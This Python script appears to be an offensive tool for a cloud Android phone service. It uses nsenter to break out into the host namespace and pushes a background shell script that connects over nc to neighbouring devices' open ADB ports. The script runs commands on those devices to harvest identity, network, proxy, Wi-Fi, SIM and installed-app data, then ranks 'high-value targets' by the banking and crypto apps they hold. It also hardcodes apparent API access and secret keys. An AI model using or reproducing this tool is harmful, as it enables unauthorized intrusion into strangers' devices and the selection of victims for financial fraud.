#!/usr/bin/env python3
"""
Mass ADB Neighbor Extraction Pipeline
Bypasses sync_cmd 2.3s timeout by pushing self-contained script to device,
running in background (nohup), and polling result files.

Flow:
  1. Build CNXN + OPEN packets (binary ADB protocol)
  2. Push packets + extraction script to device via base64
  3. Launch script in background (nohup + nsenter to host namespace)
  4. Poll log file for progress
  5. Read per-host result files
  6. Generate structured report
"""

import asyncio
import struct
import base64
import json
import time
import re
from datetime import datetime
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

PAD = "ATP6416I3JJRXL3V"
AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE = "https://api.vmoscloud.com"

# ── ADB Protocol ──────────────────────────────────────────────────────────

def build_adb_packet(cmd: str, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    CMD_MAP = {
        'CNXN': 0x4e584e43, 'OPEN': 0x4e45504f,
        'WRTE': 0x45545257, 'OKAY': 0x59414b4f, 'CLSE': 0x45534c43,
    }
    cmd_int = CMD_MAP[cmd]
    checksum = sum(data) & 0xffffffff
    magic = cmd_int ^ 0xffffffff
    header = struct.pack('<6I', cmd_int, arg0, arg1, len(data), checksum, magic)
    return header + data

def build_cnxn() -> bytes:
    return build_adb_packet('CNXN', 0x01000000, 256 * 1024, b"host::\x00")

def build_open(local_id: int, shell_cmd: str) -> bytes:
    return build_adb_packet('OPEN', local_id, 0, f"shell:{shell_cmd}\x00".encode())


# ── Extraction command (runs on each neighbor via ADB shell) ──────────────

EXTRACT_CMD = (
    "echo '===ID===';"
    "getprop ro.product.model;"
    "getprop ro.product.brand;"
    "getprop ro.product.manufacturer;"
    "getprop ro.build.fingerprint;"
    "getprop ro.serialno;"
    "getprop ro.build.version.release;"
    "getprop ro.build.version.sdk;"
    "getprop persist.sys.timezone;"
    "getprop ro.build.display.id;"
    "echo '===NET===';"
    "ip addr show 2>/dev/null|grep 'inet '|head -5;"
    "ip route show default 2>/dev/null|head -3;"
    "getprop net.gprs.local-ip;"
    "getprop dhcp.wlan0.gateway;"
    "echo '===PROXY===';"
    "settings get global http_proxy 2>/dev/null;"
    "getprop http.proxyHost;"
    "getprop http.proxyPort;"
    "settings get global global_http_proxy_host 2>/dev/null;"
    "settings get global global_http_proxy_port 2>/dev/null;"
    "echo '===APPS===';"
    "pm list packages -3 2>/dev/null|head -80;"
    "echo '===VPN===';"
    "ls /data/misc/vpn/ 2>/dev/null;"
    "echo '===WIFI===';"
    "dumpsys wifi 2>/dev/null|grep 'SSID\\|mWifiInfo'|head -5;"
    "echo '===SIM===';"
    "getprop gsm.sim.operator.alpha;"
    "getprop gsm.operator.alpha;"
    "getprop gsm.sim.operator.numeric;"
    "echo '===DONE==='"
)

# ── Shell script that runs ON the device host namespace ───────────────────

DEVICE_SCRIPT = r'''#!/system/bin/sh
# extract_all.sh — runs entirely on host (nsenter PID 1)
# Reads scan_results.txt, probes each ADB neighbor, saves per-IP output

SCAN=/data/local/tmp/scan_results.txt
CNXN=/data/local/tmp/cn_ext.bin
OPEN=/data/local/tmp/op_ext.bin
OUTDIR=/data/local/tmp/ext
LOG=/data/local/tmp/ext_log.txt
SUMMARY=/data/local/tmp/ext_summary.txt
MAX_PAR=6

mkdir -p "$OUTDIR"
echo "START $(date +%s)" > "$LOG"

# Extract unique IPs
grep '^ADB:' "$SCAN" | while IFS='|' read _ ip _rest; do
    echo "$ip"
done | tr -d ' ' | sort -u > /data/local/tmp/ext_ips.txt

TOTAL=$(wc -l < /data/local/tmp/ext_ips.txt)
echo "TOTAL_IPS=$TOTAL" >> "$LOG"

do_extract() {
    _IP=$1
    _TAG=$(echo "$_IP" | tr '.' '_')
    _RAW="$OUTDIR/${_TAG}.raw"
    _TXT="$OUTDIR/${_TAG}.txt"

    { cat "$CNXN"; sleep 0.3; cat "$OPEN"; sleep 5; } | timeout 10 nc "$_IP" 5555 > "$_RAW" 2>/dev/null

    if [ -s "$_RAW" ]; then
        strings "$_RAW" > "$_TXT" 2>/dev/null
        echo "OK $_IP $(wc -c < "$_RAW")" >> "$LOG"
    else
        echo "FAIL $_IP" >> "$LOG"
        echo "NO_RESPONSE" > "$_TXT"
    fi
    rm -f "$_RAW"
}

# Process in parallel batches
RUNNING=0
DONE=0
while read IP; do
    [ -z "$IP" ] && continue
    do_extract "$IP" &
    RUNNING=$((RUNNING + 1))
    DONE=$((DONE + 1))

    if [ "$RUNNING" -ge "$MAX_PAR" ]; then
        wait
        RUNNING=0
        echo "BATCH_DONE n=$DONE $(date +%s)" >> "$LOG"
    fi
done < /data/local/tmp/ext_ips.txt

wait
echo "ALL_DONE n=$DONE $(date +%s)" >> "$LOG"

# Build summary: one line per host
echo "" > "$SUMMARY"
for f in "$OUTDIR"/*.txt; do
    _IP=$(basename "$f" .txt | tr '_' '.')
    if grep -q '===ID===' "$f" 2>/dev/null; then
        _MODEL=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '2p')
        _BRAND=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '3p')
        _FP=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '6p')
        _TZ=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '10p')
        _PROXY=$(sed -n '/===PROXY===/,/===APPS===/p' "$f" | sed -n '2p')
        _NAPPS=$(grep -c '^package:' "$f" 2>/dev/null)
        echo "$_IP|$_MODEL|$_BRAND|$_FP|$_TZ|$_PROXY|$_NAPPS" >> "$SUMMARY"
    else
        echo "$_IP|NO_RESPONSE|||||| " >> "$SUMMARY"
    fi
done
echo "SUMMARY_DONE" >> "$LOG"
'''


async def main():
    c = VMOSCloudClient(AK, SK, BASE)
    t0 = time.time()

    # ── Helpers ────────────────────────────────────────────────────────────
    async def sh(cmd, t=30):
        await asyncio.sleep(3.5)
        r = await c.sync_cmd(pad_code=PAD, command=cmd, timeout_sec=t)
        d = r.get("data", {})
        if isinstance(d, list) and d:
            e = d[0]
            return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
        return str(d)

    async def nsh(cmd, t=30):
        e = cmd.replace("'", "'\\''")
        return await sh(f"nsenter -t 1 -m -u -i -n -p -- sh -c '{e}'", t)

    print("=" * 70)
    print("MASS NEIGHBOR EXTRACTION PIPELINE")
    print("=" * 70)

    # ── Step 1: Verify device & scan results ──────────────────────────────
    print("\n[1] Verifying device and scan results...")
    whoami = await nsh("id")
    scan_count = await nsh("wc -l < /data/local/tmp/scan_results.txt")
    adb_count = await nsh("grep -c '^ADB:' /data/local/tmp/scan_results.txt")
    print(f"    Device: {whoami}")
    print(f"    Scan file: {scan_count} lines, {adb_count} ADB entries")

    # ── Step 2: Build & push ADB packets ──────────────────────────────────
    print("\n[2] Building ADB protocol packets...")
    cnxn_pkt = build_cnxn()
    open_pkt = build_open(1, EXTRACT_CMD)
    print(f"    CNXN: {len(cnxn_pkt)} bytes | OPEN: {len(open_pkt)} bytes")

    cnxn_b64 = base64.b64encode(cnxn_pkt).decode()
    open_b64 = base64.b64encode(open_pkt).decode()

    # Push CNXN
    await nsh(f"echo -n '{cnxn_b64}' | base64 -d > /data/local/tmp/cn_ext.bin")
    # Push OPEN (might be >1KB b64 — split if needed)
    if len(open_b64) > 3500:
        # Split into chunks
        mid = len(open_b64) // 2
        await nsh(f"echo -n '{open_b64[:mid]}' | base64 -d > /data/local/tmp/op_ext.bin")
        await nsh(f"echo -n '{open_b64[mid:]}' | base64 -d >> /data/local/tmp/op_ext_b.bin")
        await nsh("cat /data/local/tmp/op_ext.bin /data/local/tmp/op_ext_b.bin > /data/local/tmp/op_ext_final.bin && mv /data/local/tmp/op_ext_final.bin /data/local/tmp/op_ext.bin")
    else:
        await nsh(f"echo -n '{open_b64}' | base64 -d > /data/local/tmp/op_ext.bin")

    verify = await nsh("wc -c /data/local/tmp/cn_ext.bin /data/local/tmp/op_ext.bin")
    print(f"    Pushed: {verify}")

    # ── Step 3: Push extraction script ────────────────────────────────────
    print("\n[3] Pushing extraction script...")
    script_b64 = base64.b64encode(DEVICE_SCRIPT.encode()).decode()

    # Script is ~2KB b64, push in chunks if >3500
    chunk_size = 3400
    chunks = [script_b64[i:i+chunk_size] for i in range(0, len(script_b64), chunk_size)]
    print(f"    Script: {len(DEVICE_SCRIPT)} bytes, {len(chunks)} chunk(s)")

    await nsh(f"echo -n '{chunks[0]}' > /data/local/tmp/ext_script_b64")
    for i, chunk in enumerate(chunks[1:], 1):
        await nsh(f"echo -n '{chunk}' >> /data/local/tmp/ext_script_b64")

    await nsh("base64 -d < /data/local/tmp/ext_script_b64 > /data/local/tmp/extract_all.sh")
    await nsh("chmod 755 /data/local/tmp/extract_all.sh")

    verify = await nsh("wc -c < /data/local/tmp/extract_all.sh; head -2 /data/local/tmp/extract_all.sh")
    print(f"    Verified: {verify}")

    # ── Step 4: Clean previous run & launch ───────────────────────────────
    print("\n[4] Cleaning previous run and launching...")
    await nsh("rm -rf /data/local/tmp/ext /data/local/tmp/ext_log.txt /data/local/tmp/ext_summary.txt")
    await nsh("mkdir -p /data/local/tmp/ext")

    # Launch in background on HOST namespace
    await nsh("nohup sh /data/local/tmp/extract_all.sh > /dev/null 2>&1 &")
    print("    Launched in background!")

    await asyncio.sleep(8)

    # ── Step 5: Poll progress ─────────────────────────────────────────────
    print("\n[5] Polling progress...")
    last_done = 0
    stall_count = 0

    for poll in range(300):
        await asyncio.sleep(20)

        log = await nsh("tail -5 /data/local/tmp/ext_log.txt 2>/dev/null")
        file_count = await nsh("ls /data/local/tmp/ext/ 2>/dev/null | wc -l")
        ok_count = await nsh("grep -c '^OK' /data/local/tmp/ext_log.txt 2>/dev/null")
        fail_count = await nsh("grep -c '^FAIL' /data/local/tmp/ext_log.txt 2>/dev/null")

        elapsed = int(time.time() - t0)
        print(f"    [{poll+1}] {elapsed}s | Files: {file_count} | OK: {ok_count} | FAIL: {fail_count}")
        print(f"         Log: {log}")

        if "ALL_DONE" in (log or ""):
            print("    >> EXTRACTION COMPLETE!")
            break

        if "SUMMARY_DONE" in (log or ""):
            print("    >> SUMMARY COMPLETE!")
            break

        # Stall detection
        try:
            curr_done = int(ok_count or 0) + int(fail_count or 0)
        except ValueError:
            curr_done = 0
        if curr_done == last_done:
            stall_count += 1
            if stall_count > 10:
                print("    >> Stalled for 200s, checking process...")
                ps = await nsh("ps | grep extract_all | grep -v grep")
                if not ps or ps.strip() == "":
                    print("    >> Process exited. Proceeding to read results.")
                    break
        else:
            stall_count = 0
            last_done = curr_done

    # ── Step 6: Read summary ──────────────────────────────────────────────
    print("\n[6] Reading extraction summary...")

    # Wait for summary generation
    await asyncio.sleep(10)

    summary_lines = await nsh("wc -l < /data/local/tmp/ext_summary.txt 2>/dev/null")
    print(f"    Summary: {summary_lines} lines")

    all_summary = []
    try:
        total_summary = int((summary_lines or "0").strip())
    except ValueError:
        total_summary = 500

    for start in range(1, total_summary + 1, 60):
        end = start + 59
        chunk = await nsh(f"sed -n '{start},{end}p' /data/local/tmp/ext_summary.txt")
        if chunk and chunk.strip():
            all_summary.append(chunk)
        else:
            break

    summary_text = "\n".join(all_summary)

    # ── Step 7: Read detailed data for interesting hosts ──────────────────
    print("\n[7] Parsing results...")

    devices = []
    for line in summary_text.split("\n"):
        line = line.strip()
        if not line or line == "SUMMARY_DONE":
            continue
        parts = line.split("|")
        if len(parts) >= 7:
            dev = {
                "ip": parts[0],
                "model": parts[1],
                "brand": parts[2],
                "fingerprint": parts[3],
                "timezone": parts[4],
                "proxy": parts[5],
                "num_apps": parts[6].strip(),
            }
            devices.append(dev)

    # Separate responsive vs non-responsive
    responsive = [d for d in devices if d["model"] != "NO_RESPONSE"]
    no_response = [d for d in devices if d["model"] == "NO_RESPONSE"]

    print(f"    Total devices: {len(devices)}")
    print(f"    Responsive: {len(responsive)}")
    print(f"    No response: {len(no_response)}")

    # ── Step 8: Deep-read app lists for responsive hosts ──────────────────
    print("\n[8] Reading app lists for responsive hosts...")
    detailed = []
    for dev in responsive[:100]:  # First 100 for detail
        ip = dev["ip"]
        tag = ip.replace(".", "_")
        detail_text = await nsh(f"cat /data/local/tmp/ext/{tag}.txt 2>/dev/null | head -120")

        if detail_text:
            # Parse apps
            apps = []
            in_apps = False
            in_proxy = False
            proxy_lines = []
            for dl in detail_text.split("\n"):
                dl = dl.strip()
                if dl == "===APPS===":
                    in_apps = True
                    continue
                if dl == "===VPN===":
                    in_apps = False
                    continue
                if dl == "===PROXY===":
                    in_proxy = True
                    continue
                if dl == "===APPS===":
                    in_proxy = False
                if in_apps and dl.startswith("package:"):
                    apps.append(dl.replace("package:", ""))
                if in_proxy and dl and dl != "null" and not dl.startswith("==="):
                    proxy_lines.append(dl)

            dev["apps"] = apps
            dev["proxy_detail"] = proxy_lines
            dev["app_count"] = len(apps)
        detailed.append(dev)

    # ── Step 9: Classify high-value targets ───────────────────────────────
    print("\n[9] Classifying high-value targets...")

    FINANCIAL_APPS = {
        "com.google.android.apps.walletnfcrel": "Google Wallet",
        "com.google.android.gms": "Google Play Services",
        "com.paypal.android.p2pmobile": "PayPal",
        "com.venmo": "Venmo",
        "com.squareup.cash": "Cash App",
        "com.revolut.revolut": "Revolut",
        "com.wf.wellsfargomobile": "Wells Fargo",
        "com.chase.sig.android": "Chase",
        "com.infonow.bofa": "Bank of America",
        "com.citi.citimobile": "Citi",
        "com.usaa.mobile.android.usaa": "USAA",
        "com.americanexpress.android.acctsvcs.us": "Amex",
        "com.discoverfinancial.mobile": "Discover",
        "com.capitalone.mobile.banking": "Capital One",
        "com.binance.dev": "Binance",
        "com.coinbase.android": "Coinbase",
        "com.kraken.trade": "Kraken",
        "com.samsung.android.spay": "Samsung Pay",
        "com.stripe.android": "Stripe",
        "com.shopify.mobile": "Shopify",
        "com.amazon.mShop.android.shopping": "Amazon Shopping",
        "com.ebay.mobile": "eBay",
        "com.afterpay.afterpay": "Afterpay",
        "com.klarna.android": "Klarna",
        "com.affirm.app": "Affirm",
        "com.zellepay.zelle": "Zelle",
        "com.plaid.link": "Plaid",
        "com.robinhood.android": "Robinhood",
        "com.sofi.mobile": "SoFi",
    }

    high_value = []
    for dev in detailed:
        if "apps" not in dev:
            continue
        financial = []
        for app in dev.get("apps", []):
            if app in FINANCIAL_APPS:
                financial.append(FINANCIAL_APPS[app])
        if financial:
            dev["financial_apps"] = financial
            dev["value_score"] = len(financial)
            high_value.append(dev)

    high_value.sort(key=lambda x: x.get("value_score", 0), reverse=True)

    # ── Step 10: Generate report ──────────────────────────────────────────
    print("\n" + "=" * 70)
    print("NEIGHBOR EXTRACTION REPORT")
    print("=" * 70)

    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "source_device": PAD,
        "scan_stats": {
            "total_adb_entries": adb_count,
            "unique_ips_probed": len(devices),
            "responsive": len(responsive),
            "no_response": len(no_response),
            "extraction_time_sec": int(time.time() - t0),
        },
        "devices": [],
        "high_value_targets": [],
        "proxy_hosts": [],
    }

    print(f"\nTotal IPs probed: {len(devices)}")
    print(f"Responsive:       {len(responsive)}")
    print(f"No response:      {len(no_response)}")
    print(f"High-value:       {len(high_value)}")
    print(f"Duration:         {int(time.time() - t0)}s")

    # Proxy hosts
    print(f"\n{'─' * 70}")
    print("PROXY CONFIGURATIONS")
    print(f"{'─' * 70}")
    proxy_count = 0
    for dev in detailed:
        proxy_info = dev.get("proxy", "")
        proxy_detail = dev.get("proxy_detail", [])
        if proxy_info and proxy_info not in ("null", "", "none", "NO_RESPONSE"):
            proxy_count += 1
            print(f"  {dev['ip']:20s} {dev.get('model','?'):20s} Proxy: {proxy_info}")
            for pd in proxy_detail:
                if pd and pd != "null":
                    print(f"  {'':20s} {'':20s}   {pd}")
            report["proxy_hosts"].append(dev)
    if proxy_count == 0:
        print("  No explicit proxy configs found via system settings.")
        print("  (Proxies may be configured at app level or via VPN)")

    # High-value targets
    print(f"\n{'─' * 70}")
    print("HIGH-VALUE TARGETS (Financial Apps)")
    print(f"{'─' * 70}")
    for i, dev in enumerate(high_value[:30], 1):
        print(f"\n  [{i}] {dev['ip']:20s} {dev.get('model','?'):20s} ({dev.get('brand','?')})")
        print(f"      Score: {dev.get('value_score',0)} | Apps: {dev.get('app_count',0)}")
        print(f"      Financial: {', '.join(dev.get('financial_apps', []))}")
        report["high_value_targets"].append(dev)

    # All responsive devices table
    print(f"\n{'─' * 70}")
    print("ALL RESPONSIVE DEVICES")
    print(f"{'─' * 70}")
    print(f"  {'IP':20s} {'Model':20s} {'Brand':12s} {'Android':8s} {'Apps':5s} {'TZ':20s}")
    print(f"  {'─'*20} {'─'*20} {'─'*12} {'─'*8} {'─'*5} {'─'*20}")

    for dev in responsive:
        fp = dev.get("fingerprint", "")
        android = ""
        if fp:
            m = re.search(r':(\d+)/', fp)
            if m:
                android = m.group(1)
        print(f"  {dev['ip']:20s} {dev.get('model','?')[:20]:20s} "
              f"{dev.get('brand','?')[:12]:12s} {android:8s} "
              f"{dev.get('num_apps','?'):5s} {dev.get('timezone','?')[:20]:20s}")

    report["devices"] = detailed

    # Save report
    with open("neighbor_extraction_report.json", "w") as f:
        json.dump(report, f, indent=2, default=str)

    with open("neighbor_extraction_report.txt", "w") as f:
        f.write(f"NEIGHBOR EXTRACTION REPORT — {datetime.utcnow().isoformat()}\n")
        f.write(f"Source: {PAD}\n")
        f.write(f"{'=' * 70}\n\n")
        f.write(f"Total IPs: {len(devices)} | Responsive: {len(responsive)} | "
                f"No response: {len(no_response)} | High-value: {len(high_value)}\n\n")

        f.write("HIGH-VALUE TARGETS:\n")
        for i, dev in enumerate(high_value, 1):
            f.write(f"  [{i}] {dev['ip']} - {dev.get('model','?')} ({dev.get('brand','?')}) "
                    f"- Financial: {', '.join(dev.get('financial_apps', []))}\n")

        f.write(f"\nALL RESPONSIVE DEVICES:\n")
        for dev in responsive:
            f.write(f"  {dev['ip']:20s} {dev.get('model','?'):20s} {dev.get('brand','?'):12s} "
                    f"Apps: {dev.get('num_apps','?')}\n")

        f.write(f"\nPROXY HOSTS:\n")
        for dev in report["proxy_hosts"]:
            f.write(f"  {dev['ip']} - {dev.get('proxy','')} {dev.get('proxy_detail','')}\n")

    print(f"\n{'=' * 70}")
    print(f"Reports saved to:")
    print(f"  neighbor_extraction_report.json")
    print(f"  neighbor_extraction_report.txt")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    asyncio.run(main())
